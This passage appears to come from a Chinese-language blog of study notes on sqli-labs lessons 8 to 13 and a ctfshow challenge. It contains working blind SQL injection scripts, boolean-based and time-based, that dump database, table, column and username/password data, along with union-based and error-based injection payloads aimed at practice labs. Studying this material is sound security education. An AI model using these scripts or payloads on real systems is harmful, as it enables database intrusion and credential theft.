class="hljs-string">f&quot;<span class="hljs-subst">&#123;TARGET_URL&#125;</span>?id=1&#x27; AND <span class="hljs-subst">&#123;payload&#125;</span> --+&quot;</span><br>    response = requests.get(url, headers=HEADERS)<br>    <span class="hljs-keyword">return</span> response.text<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">query</span>):<br>    length = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;LENGTH(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;length&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 长度为: <span class="hljs-subst">&#123;length&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> length<br>        length += <span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">query, length</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取第 <span class="hljs-subst">&#123;i&#125;</span> 个字符...&quot;</span>)<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> CHARSET:<br>            payload = <span class="hljs-string">f&quot;SUBSTR(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;i&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span><br>            response = send_payload(payload)<br>            <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                result += char<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 当前结果: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    db_length = get_length(<span class="hljs-string">&quot;DATABASE()&quot;</span>)<br>    db_name = get_string(<span class="hljs-string">&quot;DATABASE()&quot;</span>, db_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据库名: <span class="hljs-subst">&#123;db_name&#125;</span>&quot;</span>)<br><br>    table_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=<span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        table_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表数量: <span class="hljs-subst">&#123;table_count&#125;</span>&quot;</span>)<br><br>    table_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(table_count):<br>        tbl_length = get_length(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        tbl_name = get_string(<span class="hljs-string">f&quot;(SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, tbl_length)<br>        table_names.append(tbl_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 表名: <span class="hljs-subst">&#123;tbl_name&#125;</span>&quot;</span>)<br><br>    target_table = <span class="hljs-string">&quot;users&quot;</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的字段...&quot;</span>)<br>    field_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE())=<span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span><br>        response = send_payload(payload)<br>        <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-keyword">break</span><br>        field_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段数量: <span class="hljs-subst">&#123;field_count&#125;</span>&quot;</span>)<br><br>    field_names = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        fld_length = get_length(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>)<br>        fld_name = get_string(<span class="hljs-string">f&quot;(SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;<span class="hljs-subst">&#123;target_table&#125;</span>&#x27; AND table_schema=DATABASE() LIMIT <span class="hljs-subst">&#123;i&#125;</span>,1)&quot;</span>, fld_length)<br>        field_names.append(fld_name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 字段名: <span class="hljs-subst">&#123;fld_name&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取<span class="hljs-subst">&#123;target_table&#125;</span>表的数据...&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(field_count):<br>        <span class="hljs-keyword">if</span> field_names[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>]:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 获取字段: <span class="hljs-subst">&#123;field_names[i]&#125;</span>&quot;</span>)<br>            data_count = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                payload = <span class="hljs-string">f&quot;(SELECT COUNT(*) FROM <span class="hljs-subst">&#123;target_table&#125;</span>)=<span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span><br>                response = send_payload(payload)<br>                <span class="hljs-keyword">if</span> TRUE_STRING <span class="hljs-keyword">in</span> response:<br>                    <span class="hljs-keyword">break</span><br>                data_count += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据条数: <span class="hljs-subst">&#123;data_count&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_count):<br>                data_length = get_length(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>)<br>                data = get_string(<span class="hljs-string">f&quot;(SELECT <span class="hljs-subst">&#123;field_names[i]&#125;</span> FROM <span class="hljs-subst">&#123;target_table&#125;</span> LIMIT <span class="hljs-subst">&#123;j&#125;</span>,1)&quot;</span>, data_length)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 数据[<span class="hljs-subst">&#123;j+<span class="hljs-number">1</span>&#125;</span>]: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>顺便学习一下ctfshow web8 的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>url = <span class="hljs-string">&#x27;http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/&#x27;</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br> <br><span class="hljs-comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">45</span>):<br>    <span class="hljs-comment"># 获取当前使用的数据库</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr(database()from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取当前数据库的所有表</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的字段</span><br>    <span class="hljs-comment"># payload = &#x27;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    <span class="hljs-comment"># 获取flag表的数据</span><br>    payload = <span class="hljs-string">&#x27;ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d&#x27;</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在获取第 %d 个字符&#x27;</span> % i)<br>    <span class="hljs-comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, <span class="hljs-number">128</span>):<br>        result = requests.get(url + payload % (i, j))<br> <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;If&#x27;</span> <span class="hljs-keyword">in</span> result.text:<br>            name += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据库名/表名/字段名/数据: %s&#x27;</span> % name)<br>            <span class="hljs-keyword">break</span><br> <br>        <span class="hljs-comment"># 如果某个字符不存在,则停止程序</span><br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> count &gt;= (<span class="hljs-number">128</span> - <span class="hljs-number">31</span>):<br>            exit()<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/120115458">https://blog.csdn.net/wangyuxiang946/article/details/120115458</a></p><hr><h2 id="title-note-06date-2025-03-05-17-52-14tags-sql-labs"><a href="#title-note-06date-2025-03-05-17-52-14tags-sql-labs" class="headerlink" title="title: note-06date: 2025-03-05 17:52:14tags: sql-labs"></a>title: note-06<br>date: 2025-03-05 17:52:14<br>tags: sql-labs</h2><h1 id="sql-labs-less9"><a href="#sql-labs-less9" class="headerlink" title="sql-labs-less9"></a>sql-labs-less9</h1><p>题目说了是单引号闭合，然后怎么尝试都返回</p><blockquote><p>You are in………..  </p></blockquote><p>没有登录是否成功回显，没有sql报错回显<br>意思就是只能用时间延迟来判断注入是否正确，无法像less8能用respond长度来判断是否正确了<br>使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">sleep()<br>和<br>if<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure><p>来构造payload,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;,1,sleep(2)) --+</span><br></code></pre></td></tr></table></figure><p>意思是如果数据库第一个字符为’s’，则返回1（true）,否则则延迟回显<br>基于此原理</p><p>KIMI：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>ALPHABET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br>URL = <span class="hljs-string">&quot;http://sqli-labs.com/Less-9/?id=1&#x27; and substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27; and sleep(&#123;time&#125;)--+&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()<br>    response = requests.get(path)<br>    end = time.time()<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span><br>    position = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 判断是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 尝试每个字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-comment"># 获取数据库名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;database()&quot;</span>))<br><br><span class="hljs-comment"># 获取表名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取字段名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取用户名和密码</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(username,&#x27;~&#x27;,password) from users&quot;</span>))<br></code></pre></td></tr></table></figure><p>叫kimi加了注释，自己小改了一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入requests库，用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># 导入time库，用于测量时间延迟</span><br><br><span class="hljs-comment"># 定义一个包含可能字符的字符串，用于猜测数据库、表和字段的名称</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># 定义一个时间延迟，用于判断是否存在SQL注入</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 定义目标URL，其中包含一个SQL注入的payload模板</span><br><span class="hljs-comment"># &#123;sql&#125;：表示要执行的SQL查询</span><br><span class="hljs-comment"># &#123;position&#125;：表示当前猜测的字符位置</span><br><span class="hljs-comment"># &#123;char&#125;：表示当前猜测的字符</span><br><span class="hljs-comment"># &#123;time&#125;：表示延迟时间</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27; and if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># 定义一个函数，用于发送HTTP请求并判断是否存在延迟</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># 记录请求开始时间</span><br>    response = requests.get(path)  <span class="hljs-comment"># 发送HTTP GET请求</span><br>    end = time.time()   <span class="hljs-comment"># 记录请求结束时间</span><br>    <span class="hljs-comment"># 如果响应状态码为200且响应时间超过预设的延迟时间，则认为存在SQL注入</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 定义一个函数，用于提取数据库、表、字段或数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 初始化一个空字符串，用于存储结果</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化字符位置计数器</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># 每次循环增加字符位置</span><br>        <span class="hljs-comment"># 尝试猜测当前字符位置是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果为空，退出循环</span><br>        <span class="hljs-comment"># 遍历所有可能的字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># 构造完整的URL并发送请求</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># 如果猜测正确，将字符添加到结果字符串中</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># 退出循环，继续下一个字符</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 返回最终结果字符串</span><br><br><span class="hljs-comment"># 获取数据库名</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># 调用extract_data函数，传入SQL查询语句获取数据库名</span><br><br><span class="hljs-comment"># 获取表名</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># 获取字段名</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># 获取用户名和密码，可以替换自己想要的表名</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure><p>我发现把逗号放最前面就不容易丢逗号了。</p><h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>就是把less9的单引号闭合改为双引号闭合：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and if(substr(database(),1,1)=&#x27;s&#x27;,1,sleep(2)) --+<br></code></pre></td></tr></table></figure><hr><h2 id="title-note-07date-2025-03-06-21-08-00tags-sql-labs"><a href="#title-note-07date-2025-03-06-21-08-00tags-sql-labs" class="headerlink" title="title: note-07date: 2025-03-06 21:08:00tags: sql-labs"></a>title: note-07<br>date: 2025-03-06 21:08:00<br>tags: sql-labs</h2><h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>以前ctf练习题反而是post模式做的多些，<br>notice</p><blockquote><p>注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖  </p></blockquote><p>hackbar下的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&#x27;union select user(),database()#&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>之后的注入拼接进uname后  </p><p>爆用户和库名：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">database</span>()#</span><br></code></pre></td></tr></table></figure><p>爆表名：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>爆字段：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>不加<span class="hljs-keyword">and</span>后面的话好像会把其它库的同名表下的字段爆出来<br></code></pre></td></tr></table></figure><p>最后爆库：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>应该是加了检查，password不能为空</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;passwd=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>#&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure><p>回显  </p><blockquote><p>Your Login name:Dumb<br>Your Password:Dumb  </p></blockquote><p>成功闭合sql查询,然后走流程通关。</p><hr><h2 id="title-note-08date-2025-03-07-14-10-00tags-sql-labs"><a href="#title-note-08date-2025-03-07-14-10-00tags-sql-labs" class="headerlink" title="title: note-08date: 2025-03-07 14:10:00tags: sql-labs"></a>title: note-08<br>date: 2025-03-07 14:10:00<br>tags: sql-labs</h2><h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>只有登录成功回显，没其它信息<br>密码传入必须有字符，闭合点</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) #</span><br></code></pre></td></tr></table></figure><h2 id="错误注入"><a href="#错误注入" class="headerlink" title="错误注入"></a>错误注入</h2><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&amp;passwd=1&#x27;) or updatexml(1,concat(0x7e,(select user()),0x7e),1)#&amp;submit=Submit<br></code></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>因为有登录成功反馈，可以使用布尔盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) or if(length(database()=8),0,1)#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p>太菜了写不出脚本，使用sqlmap,或者bp来爆破。<br>找了一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-13/&quot;</span><br><span class="hljs-comment"># 